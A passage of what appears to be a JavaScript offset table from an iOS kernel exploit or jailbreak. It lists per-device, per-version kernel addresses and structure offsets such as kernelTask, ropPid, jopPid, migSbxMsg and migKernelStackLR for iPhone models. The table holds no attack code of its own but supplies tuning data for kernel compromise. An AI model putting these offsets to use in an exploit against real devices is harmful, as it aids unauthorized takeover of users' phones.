{\n\t\t\t\t0: {\n\t\t\t\t\tkernelTask: 0xa295e0n,\n\t\t\t\t\tpComm: 0x56cn,\n\t\t\t\t\tprocRO: 0x3a0n,\n\t\t\t\t\tipcSpace: 0x318n,\n\t\t\t\t\ttroTask: 0x28n,\n\t\t\t\t\texcGuard: 0x5dcn,\n\t\t\t\t\tkstackptr: 0xf8n,\n\t\t\t\t\tropPid: 0x160n,\n\t\t\t\t\tjopPid: 0x168n,\n\t\t\t\t\tguardExcCode: 0x330n,\n\t\t\t\t\ttaskThreads: 0x380n,\n\t\t\t\t\ttro: 0x388n,\n\t\t\t\t\tast: 0x3acn,\n\t\t\t\t\tmutexData: 0x3b8n,\n\t\t\t\t\tctid: 0x438n\n\t\t\t\t},\n\t\t\t\t1: {\n\t\t\t\t\tkernelTask: 0xa2d5f8n,\n\t\t\t\t\ttaskThreads: 0x378n,\n\t\t\t\t\ttro: 0x380n,\n\t\t\t\t\tast: 0x3a4n,\n\t\t\t\t\tmutexData: 0x3b0n,\n\t\t\t\t\tctid: 0x430n\n\t\t\t\t},\n\t\t\t\t2: {\n\t\t\t\t\tkernelTask: 0xa35a20n\n\t\t\t\t},\n\t\t\t\t3: {\n\t\t\t\t\tkernelTask: 0xa2da20n\n\t\t\t\t},\n\t\t\t\t4: {\n\t\t\t\t\tkernelTask: 0xa9ebe8n,\n\t\t\t\t\tprocRO: 0x3c0n,\n\t\t\t\t\texcGuard: 0x5fcn,\n\t\t\t\t\ttaskThreads: 0x380n,\n\t\t\t\t\ttro: 0x388n,\n\t\t\t\t\tast: 0x3acn,\n\t\t\t\t\tmutexData: 0x3b8n,\n\t\t\t\t\tctid: 0x438n,\n\t\t\t\t\tmigLock: 0x37b8b80n,\n\t\t\t\t\tmigSbxMsg: 0x37b8ba0n,\n\t\t\t\t\tmigKernelStackLR: 0x3190fa0n\n\t\t\t\t},\n\t\t\t\t5: {\n\t\t\t\t\tkernelTask: 0xaa6cd0n,\n\t\t\t\t\tmigLock: 0x37d4c90n,\n\t\t\t\t\tmigSbxMsg: 0x37d4cb0n,\n\t\t\t\t\tmigKernelStackLR: 0x31acce4n\n\t\t\t\t},\n\t\t\t\t6: {\n\t\t\t\t\tkernelTask: 0xaaade0n,\n\t\t\t\t\tguardExcCode: 0x338n,\n\t\t\t\t\ttaskThreads: 0x388n,\n\t\t\t\t\ttro: 0x390n,\n\t\t\t\t\tast: 0x3b4n,\n\t\t\t\t\tmutexData: 0x3c0n,\n\t\t\t\t\tctid: 0x440n,\n\t\t\t\t\tmigLock: 0x37dcc90n,\n\t\t\t\t\tmigSbxMsg: 0x37dccb0n,\n\t\t\t\t\tmigKernelStackLR: 0x31b5b60n,\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t},\n\n\t// iPhone 13\n\t// iPhone 13 Mini\n\t// iPhone 13 Pro\n\t// iPhone 13 Pro Max\n\t// iPhone SE 3\n\t// iPhone 14\n\t// iPhone 14 Plus\n\t\"iPhone14\": {\n\t\t\"*\": {\n\t\t\t23: {\n\t\t\t\t0: {\n\t\t\t\t\tpComm: 0x568n,\n\t\t\t\t\texcGuard: 0x5d4n,\n\t\t\t\t\tkstackptr: 0xf0n,\n\t\t\t\t\tropPid: 0x160n,\n\t\t\t\t\tjopPid: 0x168n,\n\t\t\t\t\tguardExcCode: 0x330n,\n\t\t\t\t\ttaskThreads: 0x370n,\n\t\t\t\t\ttro: 0x380n,\n\t\t\t\t\tast: 0x3a4n,\n\t\t\t\t\tmutexData: 0x3b0n,\n\t\t\t\t\tctid: 0x430n,\n\t\t\t\t\ttroTask: 0x20n\n\t\t\t\t},\n\t\t\t\t3: {\n\t\t\t\t\tkernelTask: 0x918ee0n,\n\t\t\t\t},\n\t\t\t\t4: {\n\t\t\t\t\tkernelTask: 0x91d318n,\n\t\t\t\t\tpComm: 0x56cn,\n\t\t\t\t\ttroTask: 0x28n,\n\t\t\t\t\tguardExcCode: 0x338n,\n\t\t\t\t\ttaskThreads: 0x378n,\n\t\t\t\t\ttro: 0x388n,\n\t\t\t\t\tast: 0x3acn,\n\t\t\t\t\tmutexData: 0x3b8n,\n\t\t\t\t\tctid: 0x438n\n\t\t\t\t},\n\t\t\t\t5: {\n\t\t\t\t\tkernelTask: 0x925770n\n\t\t\t\t},\n\t\t\t\t6: {\n\t\t\t\t\tkernelTask: 0x9256d0n\n\t\t\t\t},\n\t\t\t\t6.1: {\n\t\t\t\t\tkernelTask: 0x925720n\n\t\t\t\t}\n\t\t\t},\n\t\t\t24: {\n\t\t\t\t0: {\n\t\t\t\t\tkernelTask: 0x9f6230n,\n\t\t\t\t\tpComm: 0x56cn,\n\t\t\t\t\tprocRO: 0x3b8n,\n\t\t\t\t\tipcSpace: 0x318n,\n\t\t\t\t\ttroTask: 0x28n,\n\t\t\t\t\texcGuard: 0x5f4n,\n\t\t\t\t\tkstackptr: 0xf8n,\n\t\t\t\t\tropPid: 0x168n,\n\t\t\t\t\tjopPid: 0x170n,\n\t\t\t\t\tguardExcCode: 0x338n,\n\t\t\t\t\ttaskThreads: 0x388n,\n\t\t\t\t\ttro: 0x390n,\n\t\t\t\t\tast: 0x3b4n,\n\t\t\t\t\tmutexData: 0x3c0n,\n\t\t\t\t\tctid: 0x440n\n\t\t\t\t},\n\t\t\t\t1: {\n\t\t\t\t\tkernelTask: 0x9f6248n,\n\t\t\t\t\ttaskThreads: 0x380n,\n\t\t\t\t\ttro: 0x388n,\n\t\t\t\t\tast: 0x3acn,\n\t\t\t\t\tmutexData: 0x3b8n,\n\t\t\t\t\tctid: 0x438n\n\t\t\t\t},\n\t\t\t\t2: {\n\t\t\t\t\tkernelTask: 0xa02678n\n\t\t\t\t},\n\t\t\t\t3: {\n\t\t\t\t\tkernelTask: 0x9fa678n\n\t\t\t\t},\n\t\t\t\t4: {\n\t\t\t\t\tkernelTask: 0xa67b18n,\n\t\t\t\t\tprocRO: 0x3e0n,\n\t\t\t\t\texcGuard: 0x624n,\n\t\t\t\t\ttaskThreads: 0x388n,\n\t\t\t\t\ttro: 0x390n,\n\t\t\t\t\tast: 0x3b4n,\n\t\t\t\t\tmutexData: 0x3c0n,\n\t\t\t\t\tctid: 0x448n,\n\t\t\t\t\tmigLock: 0x382c218n,\n\t\t\t\t\tmigSbxMsg: 0x382c238n,\n\t\t\t\t\tmigKernelStackLR: 0x317d020n\n\t\t\t\t},\n\t\t\t\t5: {\n\t\t\t\t\tkernelTask: 0xa6fc00n,\n\t\t\t\t\tmigLock: 0x3848428n,\n\t\t\t\t\tmigSbxMsg: 0x3848448n,\n\t\t\t\t\tmigKernelStackLR: 0x31994a4n\n\t\t\t\t},\n\t\t\t\t6: {\n\t\t\t\t\tkernelTask: 0xa73d10n,\n\t\t\t\t\tguardExcCode: 0x340n,\n\t\t\t\t\ttaskThreads: 0x390n,\n\t\t\t\t\ttro: 0x398n,\n\t\t\t\t\tast: 0x3bcn,\n\t\t\t\t\tmutexData: 0x3c8n,\n\t\t\t\t\tctid: 0x450n,\n\t\t\t\t\tmigLock: 0x38543a8n,\n\t\t\t\t\tmigSbxMsg: 0x38543c8n,\n\t\t\t\t\tmigKernelStackLR: 0x31a27e0n,\n\t\t\t\t}\n\t\t\t}\n\t\t},\n\t\t\"6\": {\n\t\t\t23: {\n\t\t\t\t4: {\n\t\t\t\t\tkernelTask: 0x92d318n\n\t\t\t\t},\n\t\t\t\t5: {\n\t\t\t\t\tkernelTask: 0x935770n\n\t\t\t\t},\n\t\t\t\t6: {\n\t\t\t\t\tkernelTask: 0x9316d0n\n\t\t\t\t},\n\t\t\t\t6.1: {\n\t\t\t\t\tkernelTask: 0x931720n\n\t\t\t\t}\n\t\t\t},\n\t\t\t24: {\n\t\t\t\t0: {\n\t\t\t\t\tkernelTask: 0xa06230n\n\t\t\t\t},\n\t\t\t\t1: {\n\t\t\t\t\tkernelTask: 0xa06248n\n\t\t\t\t},\n\t\t\t\t2: {\n\t\t\t\t\tkernelTask: 0xa12678n\n\t\t\t\t},\n\t\t\t\t3: {\n\t\t\t\t\tkernelTask: 0xa0a678n\n\t\t\t\t},\n\t\t\t\t4: {\n\t\t\t\t\tkernelTask: 0xa77b18n,\n\t\t\t\t\tmigLock: 0x3898c18n,\n\t\t\t\t\tmigSbxMsg: 0x3898c38n,\n\t\t\t\t\tmigKernelStackLR: 0x31dff60n\n\t\t\t\t},\n\t\t\t\t5: {\n\t\t\t\t\tkernelTask: 0xa7fc00n,\n\t\t\t\t\tmigLock: 0x38b4e28n,\n\t\t\t\t\tmigSbxMsg: 0x38b4e48n,\n\t\t\t\t\tmigKernelStackLR: 0x31fc3e4n\n\t\t\t\t},\n\t\t\t\t6: {\n\t\t\t\t\tkernelTask: 0xa83d10n,\n\t\t\t\t\tmigLock: 0x38bcda8n,\n\t\t\t\t\tmigSbxMsg: 0x38bcdc8n,\n\t\t\t\t\tmigKernelStackLR: 0x3205560n,\n\t\t\t\t}\n\t\t\t}\n\t\t},\n\t\t\"7\": {\n\t\t\t23: {\n\t\t\t\t4: {\n\t\t\t\t\tkernelTask: 0x919318n\n\t\t\t\t},\n\t\t\t\t5: {\n\t\t\t\t\tkernelTask: 0x921770n\n\t\t\t\t},\n\t\t\t\t6: {\n\t\t\t\t\tkernelTask: 0x9216d0n\n\t\t\t\t},\n\t\t\t\t6.1: {\n\t\t\t\t\tkernelTask: 0x921720n\n\t\t\t\t}\n\t\t\t},\n\t\t\t24: {\n\t\t\t\t0: {\n\t\t\t\t\tkernelTask: 0x9f2230n\n\t\t\t\t},\n\t\t\t\t1: {\n\t\t\t\t\tkernelTask: 0x9f2248n\n\t\t\t\t},\n\t\t\t\t2: {\n\t\t\t\t\tkernelTask: 0x9fe678n\n\t\t\t\t},\n\t\t\t\t3: {\n\t\t\t\t\tkernelTask: 0x9f6678n\n\t\t\t\t},\n\t\t\t\t4: {\n\t\t\t\t\tkernelTask: 0xa67b18n,\n\t\t\t\t\tmigLock: 0x3813d98n,\n\t\t\t\t\tmigSbxMsg: 0x3813db8n,\n\t\t\t\t\tmigKernelStackLR: 0x3163ae0n\n\t\t\t\t},\n\t\t\t\t5: {\n\t\t\t\t\tkernelTask: 0xa6fc00n,\n\t\t\t\t\tmigLock: 0x382ffa8n,\n\t\t\t\t\tmigSbxMsg: 0x382ffc8n,\n\t\t\t\t\tmigKernelStackLR: 0x317ffa4n\n\t\t\t\t},\n\t\t\t\t6: {\n\t\t\t\t\tkernelTask: 0xa6fd10n,\n\t\t\t\t\tmigLock: 0x3833fa8n,\n\t\t\t\t\tmigSbxMsg: 0x3833fc8n,\n\t\t\t\t\tmigKernelStackLR: 0x31852a0n,\n\t\t\t\t}\n\t\t\t}\n\t\t},\n\t\t\"8\": {\n\t\t\t23: {\n\t\t\t\t4: {\n\t\t\t\t\tkernelTask: 0x919318n\n\t\t\t\t},\n\t\t\t\t5: {\n\t\t\t\t\tkernelTask: 0x921770n\n\t\t\t\t},\n\t\t\t\t6: {\n\t\t\t\t\tkernelTask: 0x9216d0n\n\t\t\t\t},\n\t\t\t\t6.1: {\n\t\t\t\t\tkernelTask: 0x921720n\n\t\t\t\t}\n\t\t\t},\n\t\t\t24: {\n\t\t\t\t0: {\n\t\t\t\t\tkernelTask: 0x9f2230n\n\t\t\t\t},\n\t\t\t\t1: {\n\t\t\t\t\tkernelTask: 0x9f2248n\n\t\t\t\t},\n\t\t\t\t2: {\n\t\t\t\t\tkernelTask: 0x9fe678n\n\t\t\t\t},\n\t\t\t\t3: {\n\t\t\t\t\tkernelTask: 0x9f6678n\n\t\t\t\t},\n\t\t\t\t4: {\n\t\t\t\t\tkernelTask: 0xa67b18n,\n\t\t\t\t\tmigLock: 0x3813d98n,\n\t\t\t\t\tmigSbxMsg: 0x3813db8n,\n\t\t\t\t\tmigKernelStackLR: 0x3163ae0n\n\t\t\t\t},\n\t\t\t\t5: {\n\t\t\t\t\tkernelTask: 0xa6fc00n,\n\t\t\t\t\tmigLock: 0x382ffa8n,\n\t\t\t\t\tmigSbxMsg: 0x382ffc8n,\n\t\t\t\t\tmigKernelStackLR: 0x317ffa4n\n\t\t\t\t},\n\t\t\t\t6: {\n\t\t\t\t\tkernelTask: 0xa6fd10n,\n\t\t\t\t\tmigLock: 0x3833fa8n,\n\t\t\t\t\tmigSbxMsg: 0x3833fc8n,\n\t\t\t\t\tmigKernelStackLR: 0x31852a0n,\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t},\n\n\t// iPhone 14 Pro\n\t// iPhone 14 Pro Max\n\t// iPhone 15\n\t// iPhone 15 Plus\n\t\"iPhone15\": {\n\t\t\"*\": {\n\t\t\t23: {\n\t\t\t\t0: {\n\t\t\t\t\tpComm: 0x568n,\n\t\t\t\t\texcGuard: 0x5d4n,\n\t\t\t\t\tkstackptr: 0xf0n,\n\t\t\t\t\tropPid: 0x160n,\n\t\t\t\t\tjopPid: 0x168n,\n\t\t\t\t\tguardExcCode: 0x330n,\n\t\t\t\t\ttaskThreads: 0x370n,\n\t\t\t\t\ttro: 0x380n,\n\t\t\t\t\tast: 0x3a4n,\n\t\t\t\t\tmutexData: 0x3b0n,\n\t\t\t\t\tctid: 0x430n,\n\t\t\t\t\ttroTask: 0x20n\n\t\t\t\t},\n\t\t\t\t3: {\n\t\t\t\t\tkernelTask: 0x914e00n,\n\t\t\t\t},\n\t\t\t\t4: {\n\t\t\t\t\tkernelTask: 0x919238n,\n\t\t\t\t\tpComm: 0x56cn,\n\t\t\t\t\ttroTask: 0x28n,\n\t\t\t\t\tguardExcCode: 0x338n,\n\t\t\t\t\ttaskThreads: 0x378n,\n\t\t\t\t\ttro: 0x388n,\n\t\t\t\t\tast: 0x3acn,\n\t\t\t\t\tmutexData: 0x3b8n,\n\t\t\t\t\tctid: 0x438n\n\t\t\t\t},\n\t\t\t\t5: {\n\t\t\t\t\tkernelTask: 0x921690n\n\t\t\t\t},\n\t\t\t\t6: {\n\t\t\t\t\tkernelTask: 0x9215f0n\n\t\t\t\t},\n\t\t\t\t6.1: {\n\t\t\t\t\tkernelTask: 0x921640n\n\t\t\t\t},\n\t\t\t\t6.2: {\n\t\t\t\t\tkernelTask: 0x91d640n\n\t\t\t\t}\n\t\t\t},\n\t\t\t24: {\n\t\t\t\t0: {\n\t\t\t\t\tkernelTask: 0x9ee150n,\n\t\t\t\t\tpComm: 0x56cn,\n\t\t\t\t\tprocRO: 0x3b8n,\n\t\t\t\t\tipcSpace: 0x318n,\n\t\t\t\t\ttroTask: 0x28n,\n\t\t\t\t\texcGuard: 0x5f4n,\n\t\t\t\t\tkstackptr: 0xf8n,\n\t\t\t\t\tropPid: 0x168n,\n\t\t\t\t\tjopPid: 0x170n,\n\t\t\t\t\tguardExcCode: 0x338n,\n\t\t\t\t\ttaskThreads: 0x388n,\n\t\t\t\t\ttro: 0x390n,\n\t\t\t\t\tast: 0x3b4n,\n\t\t\t\t\tmutexData: 0x3c0n,\n\t\t\t\t\tctid: 0x440n\n\t\t\t\t},\n\t\t\t\t1: {\n\t\t\t\t\tkernelTask: 0x9f2168n,\n\t\t\t\t\ttaskThreads: 0x380n,\n\t\t\t\t\ttro: 0x388n,\n\t\t\t\t\tast: 0x3acn,\n\t\t\t\t\tmutexData: 0x3b8n,\n\t\t\t\t\tctid: 0x438n\n\t\t\t\t},\n\t\t\t\t2: {\n\t\t\t\t\tkernelTask: 0x9fe598n\n\t\t\t\t},\n\t\t\t\t3: {\n\t\t\t\t\tkernelTask: 0x9f6598n\n\t\t\t\t},\n\t\t\t\t4: {\n\t\t\t\t\tkernelTask: 0xa67c18n,\n\t\t\t\t\tprocRO: 0x3e0n,\n\t\t\t\t\texcGuard: 0x624n,\n\t\t\t\t\ttaskThreads: 0x388n,\n\t\t\t\t\ttro: 0x390n,\n\t\t\t\t\tast: 0x3b4n,\n\t\t\t\t\tmutexData: 0x3c0n,\n\t\t\t\t\tctid: 0x448n,\n\t\t\t\t\tmigLock: 0x37863f8n,\n\t\t\t\t\tmigSbxMsg: 0x3786418n,\n\t\t\t\t\tmigKernelStackLR: 0x3131620n\n\t\t\t\t},\n\t\t\t\t5: {\n\t\t\t\t\tkernelTask: 0xa6fd00n,\n\t\t\t\t\tmigLock: 0x37a2788n,\n\t\t\t\t\tmigSbxMsg: 0x37a27a8n,\n\t\t\t\t\tmigKernelStackLR: 0x314dc24n\n\t\t\t\t},\n\t\t\t\t6: {\n\t\t\t\t\tkernelTask: 0xa6fe10n,\n  \t\t\t\t\tguardExcCode: 0x340n,\n\t\t\t\t\ttaskThreads: 0x390n,\n  \t\t\t\t\ttro: 0x398n,\n  \t\t\t\t\tast: 0x3bcn,\n\t\t\t\t\tmutexData: 0x3c8n,\n\t\t\t\t\tctid: 0x450n,\n\t\t\t\t\tmigLock: 0x37aa708n,\n\t\t\t\t\tmigSbxMsg: 0x37aa728n,\n\t\t\t\t\tmigKernelStackLR: 0x3152ee0n\n\t\t\t\t}\n\t\t\t}\n\t\t},\n\t\t\"4\": {\n\t\t\t23: {\n\t\t\t\t4: {\n\t\t\t\t\tkernelTask: 0x941238n\n\t\t\t\t},\n\t\t\t\t5: {\n\t\t\t\t\tkernelTask: 0x949690n\n\t\t\t\t},\n\t\t\t\t6: {\n\t\t\t\t\tkernelTask: 0x9495f0n\n\t\t\t\t},\n\t\t\t\t6.1: {\n\t\t\t\t\tkernelTask: 0x949640n\n\t\t\t\t}\n\t\t\t},\n\t\t\t24: {\n\t\t\t\t0: {\n\t\t\t\t\tkernelTask: 0xa2a150n\n\t\t\t\t},\n\t\t\t\t1: {\n\t\t\t\t\tkernelTask: 0xa2a168n\n\t\t\t\t},\n\t\t\t\t2: {\n\t\t\t\t\tkernelTask: 0xa3a598n\n\t\t\t\t},\n\t\t\t\t3: {\n\t\t\t\t\tkernelTask: 0xa32598n\n\t\t\t\t},\n\t\t\t\t4: {\n\t\t\t\t\tkernelTask: 0xaa3c18n,\n\t\t\t\t\tmigLock: 0x38c5388n,\n\t\t\t\t\tmigSbxMsg: 0x38c53a8n,\n\t\t\t\t\tmigKernelStackLR: 0x325f1e0n\n\t\t\t\t},\n\t\t\t\t5: {\n\t\t\t\t\tkernelTask: 0xaa7d00n,\n\t\t\t\t\tmigLock: 0x38dd698n,\n\t\t\t\t\tmigSbxMsg: 0x38dd6b8n,\n\t\t\t\t\tmigKernelStackLR: 0x32777e4n\n\t\t\t\t},\n\t\t\t\t6: {\n\t\t\t\t\tkernelTask: 0xaabe10n,\n\t\t\t\t\tmigLock: 0x38e5618n,\n\t\t\t\t\tmigSbxMsg: 0x38e5638n,\n\t\t\t\t\tmigKernelStackLR: 0x3280aa0n,\n\t\t\t\t}\n\t\t\t}\n\t\t},\n\t\t\"5\": {\n\t\t\t23: {\n\t\t\t\t4: {\n\t\t\t\t\tkernelTask: 0x941238n\n\t\t\t\t},\n\t\t\t\t5: {\n\t\t\t\t\tkernelTask: 0x949690n\n\t\t\t\t},\n\t\t\t\t6: {\n\t\t\t\t\tkernelTask: 0x9495f0n\n\t\t\t\t},\n\t\t\t\t6.1: {\n\t\t\t\t\tkernelTask: 0x949640n\n\t\t\t\t}\n\t\t\t},\n\t\t\t24: {\n\t\t\t\t0: {\n\t\t\t\t\tkernelTask: 0xa2a150n\n\t\t\t\t},\n\t\t\t\t1: {\n\t\t\t\t\tkernelTask: 0xa2a168n\n\t\t\t\t},\n\t\t\t\t2: {\n\t\t\t\t\tkernelTask: 0xa3a598n\n\t\t\t\t},\n\t\t\t\t3: {\n\t\t\t\t\tkernelTask: 0xa32598n\n\t\t\t\t},\n\t\t\t\t4: {\n\t\t\t\t\tkernelTask: 0xaa3c18n,\n\t\t\t\t\tmigLock: 0x38c5388n,\n\t\t\t\t\tmigSbxMsg: 0x38c53a8n,\n\t\t\t\t\tmigKernelStackLR: 0x325f1e0n\n\t\t\t\t},\n\t\t\t\t5: {\n\t\t\t\t\tkernelTask: 0xaa7d00n,\n\t\t\t\t\tmigLock: 0x38dd698n,\n\t\t\t\t\tmigSbxMsg: 0x38dd6b8n,\n\t\t\t\t\tmigKernelStackLR: 0x32777e4n\n\t\t\t\t},\n\t\t\t\t6: {\n\t\t\t\t\tkernelTask: 0xaabe10n,\n\t\t\t\t\tmigLock: 0x38e5618n,\n\t\t\t\t\tmigSbxMsg: 0x38e5638n,\n\t\t\t\t\tmigKernelStackLR: 0x3280aa0n,\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t},\n\n\t// iPhone 15 Pro\n\t// iPhone 15 Pro Max\n\t\"iPhone16\": {\n\t\t\"*\": {\n\t\t\t23: {\n\t\t\t\t0: {\n\t\t\t\t\tpComm: 0x568n,\n\t\t\t\t\texcGuard: 0x5d4n,\n\t\t\t\t\tkstackptr: 0x140n,\n\t\t\t\t\tropPid: 0x1b0n,\n\t\t\t\t\tjopPid: 0x1b8n,\n\t\t\t\t\tguardExcCode: 0x380n,\n\t\t\t\t\ttaskThreads: 0x3c0n,\n\t\t\t\t\ttro: 0x3d0n,\n\t\t\t\t\tast: 0x3f4n,\n\t\t\t\t\tmutexData: 0x400n,\n\t\t\t\t\tctid: 0x480n,\n\t\t\t\t\ttroTask: 0x20n\n\t\t\t\t},\n\t\t\t\t3: {\n\t\t\t\t\tkernelTask: 0x978ef0n,\n\t\t\t\t},\n\t\t\t\t4: {\n\t\t\t\t\tkernelTask: 0x991eb0n,\n\t\t\t\t\tpComm: 0x56cn,\n\t\t\t\t\ttroTask: 0x28n,\n\t\t\t\t\toptions: 0xc0n,\n\t\t\t\t\tguardExcCode: 0x388n,\n\t\t\t\t\ttaskThreads: 0x3c8n,\n\t\t\t\t\ttro: 0x3d8n,\n\t\t\t\t\tast: 0x3fcn,\n\t\t\t\t\tmutexData: 0x408n,\n\t\t\t\t\tctid: 0x488n\n\t\t\t\t},\n\t\t\t\t5: {\n\t\t\t\t\tkernelTask: 0x99a308n,\n\t\t\t\t},\n\t\t\t\t6: {\n\t\t\t\t\tkernelTask: 0x99a268n\n\t\t\t\t},\n\t\t\t\t6.1: {\n\t\t\t\t\tkernelTask: 0x99a2b8n\n\t\t\t\t},\n\t\t\t\t6.2: {\n\t\t\t\t\tkernelTask: 0x9962b8n\n\t\t\t\t}\n\t\t\t},\n\t\t\t24: {\n\t\t\t\t0: {\n\t\t\t\t\tkernelTask: 0xaae870n,\n\t\t\t\t\tpComm: 0x56cn,\n\t\t\t\t\tprocRO: 0x3b8n,\n\t\t\t\t\tipcSpace: 0x318n,\n\t\t\t\t\ttroTask: 0x28n,\n\t\t\t\t\texcGuard: 0x5f4n,\n\t\t\t\t\tkstackptr: 0x148n,\n\t\t\t\t\tropPid: 0x1b8n,\n\t\t\t\t\tjopPid: 0x1c0n,\n\t\t\t\t\tguardExcCode: 0x388n,\n\t\t\t\t\ttaskThreads: 0x3d8n,\n\t\t\t\t\ttro: 0x3e0n,\n\t\t\t\t\tast: 0x404n,\n\t\t\t\t\tmutexData: 0x410n,\n\t\t\t\t\tctid: 0x490n,\n\t\t\t\t\toptions: 0xc0n\n\t\t\t\t},\n\t\t\t\t1: {\n\t\t\t\t\tkernelTask: 0xaae888n,\n\t\t\t\t\ttaskThreads: 0x3d0n,\n\t\t\t\t\ttro: 0x3d8n,\n\t\t\t\t\tast: 0x3fcn,\n\t\t\t\t\tmutexData: 0x408n,\n\t\t\t\t\tctid: 0x488n\n\t\t\t\t},\n\t\t\t\t2: {\n\t\t\t\t\tkernelTask: 0xab6cb8n\n\t\t\t\t},\n\t\t\t\t3: {\n\t\t\t\t\tkernelTask: 0xab2cb8n\n\t\t\t\t},\n\t\t\t\t4: {\n\t\t\t\t\tkernelTask: 0xb23d28n,\n\t\t\t\t\tprocRO: 0x3e0n,\n\t\t\t\t\texcGuard: 0x624n,\n\t\t\t\t\ttaskThreads: 0x3d8n,\n\t\t\t\t\ttro: 0x3e0n,\n\t\t\t\t\tast: 0x404n,\n\t\t\t\t\tmutexData: 0x410n,\n\t\t\t\t\tctid: 0x498n,\n\t\t\t\t\tmigLock: 0x3c03ef0n,\n\t\t\t\t\tmigSbxMsg: 0x3c03f10n,\n\t\t\t\t\tmigKernelStackLR: 0x3582fe0n\n\t\t\t\t},\n\t\t\t\t5: {\n\t\t\t\t\tkernelTask: 0xb2be10n,\n\t\t\t\t\tmigLock: 0x3c181a8n,\n\t\t\t\t\tmigSbxMsg: 0x3c181c8n,\n\t\t\t\t\tmigKernelStackLR: 0x35993a4n\n\t\t\t\t},\n\t\t\t\t6: {\n\t\t\t\t\tkernelTask: 0xb2ff20n,\n  \t\t\t\t\tguardExcCode: 0x390n,\n\t\t\t\t\ttaskThreads: 0x3e0n,\n  \t\t\t\t\ttro: 0x3e8n,\n\t\t\t\t\tast: 0x40cn,\n\t\t\t\t\tmutexData: 0x418n,\n\t\t\t\t\tctid: 0x4a0n,\n\t\t\t\t\tmigLock: 0x3c241a8n,\n\t\t\t\t\tmigSbxMsg: 0x3c241c8n,\n\t\t\t\t\tmigKernelStackLR: 0x35a26a0n,\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t},\n\t// iPhone 16\n\t// iPhone 16 plus\n\t// iPhone 16 pro\n\t// iPhone 16 pro max\n\t\"iPhone17\": {\n\t\t\"*\": {\n\t\t\t24: {\n\t\t\t\t0: {\n\t\t\t\t\tkernelTask: 0xb7e1c8n,\n\t\t\t\t\tpComm: 0x56cn,\n\t\t\t\t\tprocRO: 0x3b8n,\n\t\t\t\t\tipcSpace: 0x318n,\n\t\t\t\t\ttroTask: 0x28n,\n\t\t\t\t\texcGuard: 0x5fcn,\n\t\t\t\t\tkstackptr: 0x148n,\n\t\t\t\t\tropPid: 0x1b8n,\n\t\t\t\t\tjopPid: 0x1c0n,\n\t\t\t\t\tguardExcCode: 0x390n,\n\t\t\t\t\ttaskThreads: 0x3e0n,\n  \t\t\t\t\ttro: 0x3e8n,\n\t\t\t\t\tast: 0x40cn,\n\t\t\t\t\tmutexData: 0x418n,\n\t\t\t\t\tctid: 0x4a8n,\n\t\t\t\t\toptions: 0xc0n\n\t\t\t\t},\n\t\t\t\t1: {\n\t\t\t\t\tkernelTask: 0xb7e1e0n,\n\t\t\t\t\ttaskThreads: 0x3d8n,\n\t\t\t\t\ttro: 0x3e0n,\n\t\t\t\t\tast: 0x404n,\n\t\t\t\t\tmutexData: 0x410n,\n\t\t\t\t\tctid: 0x4a0n,\n\t\t\t\t},\n\t\t\t\t2: {\n\t\t\t\t\tkernelTask: 0xb86610n\n\t\t\t\t},\n\t\t\t\t3: {\n\t\t\t\t\tkernelTask: 0xb82610n\n\t\t\t\t},\n\t\t\t\t4: {\n\t\t\t\t\tkernelTask: 0xc0fd80n,\n\t\t\t\t\tprocRO: 0x3e0n,\n\t\t\t\t\texcGuard: 0x624n,\n\t\t\t\t\ttaskThreads: 0x3e0n,\n  \t\t\t\t\ttro: 0x3e8n,\n\t\t\t\t\tast: 0x40cn,\n\t\t\t\t\tmutexData: 0x418n,\n\t\t\t\t\tctid: 0x4a8n,\n\t\t\t\t\tmigLock: 0x4042dc0n,\n\t\t\t\t\tmigSbxMsg: 0x4042de0n,\n\t\t\t\t\tmigKernelStackLR: 0x3912aa0n\n\t\t\t\t},\n\t\t\t\t5: {\n\t\t\t\t\tkernelTask: 0xc17e68n,\n\t\t\t\t\tmigLock: 0x405eff8n,\n\t\t\t\t\tmigSbxMsg: 0x405f018n,\n\t\t\t\t\tmigKernelStackLR: 0x392be64n\n\t\t\t\t},\n\t\t\t\t6: {\n\t\t\t\t\tkernelTask: 0xc1bf78n,\n  \t\t\t\t\tguardExcCode: 0x398n,\n\t\t\t\t\ttaskThreads: 0x3e8n,\n  \t\t\t\t\ttro: 0x3f0n,\n\t\t\t\t\tast: 0x414n,\n\t\t\t\t\tmutexData: 0x420n,\n\t\t\t\t\tctid: 0x4b0n,\n\t\t\t\t\tmigLock: 0x4066f88n,\n\t\t\t\t\tmigSbxMsg: 0x4066fa8n,\n\t\t\t\t\tmigKernelStackLR: 0x39352e0n,\n\t\t\t\t}\n\t\t\t}\n\t\t},\n\t\t\"5\": {\n\t\t\t24: {\n\t\t\t\t0: {\n\t\t\t\t\tkernelTask: 0xb7e1c8n,\n\t\t\t\t\tpComm: 0x56cn,\n\t\t\t\t\tprocRO: 0x3b8n,\n\t\t\t\t\tipcSpace: 0x318n,\n\t\t\t\t\ttroTask: 0x28n,\n\t\t\t\t\texcGuard: 0x5fcn,\n\t\t\t\t\tkstackptr: 0x148n,\n\t\t\t\t\tropPid: 0x1b8n,\n\t\t\t\t\tjopPid: 0x1c0n,\n\t\t\t\t\tguardExcCode: 0x390n,\n\t\t\t\t\ttaskThreads: 0x3e0n,\n  \t\t\t\t\ttro: 0x3e8n,\n\t\t\t\t\tast: 0x40cn,\n\t\t\t\t\tmutexData: 0x418n,\n\t\t\t\t\tctid: 0x4a8n,\n\t\t\t\t\toptions: 0xc0n\n\t\t\t\t},\n\t\t\t\t1: {\n\t\t\t\t\tkernelTask: 0xb7e1e0n,\n\t\t\t\t\ttaskThreads: 0x3d8n,\n\t\t\t\t\ttro: 0x3e0n,\n\t\t\t\t\tast: 0x404n,\n\t\t\t\t\tmutexData: 0x410n,\n\t\t\t\t\tctid: 0x4a0n,\n\t\t\t\t},\n\t\t\t\t2: {\n\t\t\t\t\tkernelTask: 0xb86610n\n\t\t\t\t},\n\t\t\t\t3: {\n\t\t\t\t\tkernelTask: 0xb82610n\n\t\t\t\t},\n\t\t\t\t4: {\n\t\t\t\t\tkernelTask: 0xc0fd80n,\n\t\t\t\t\tprocRO: 0x3e0n,\n\t\t\t\t\texcGuard: 0x624n,\n\t\t\t\t\ttaskThreads: 0x3e0n,\n  \t\t\t\t\ttro: 0x3e8n,\n\t\t\t\t\tast: 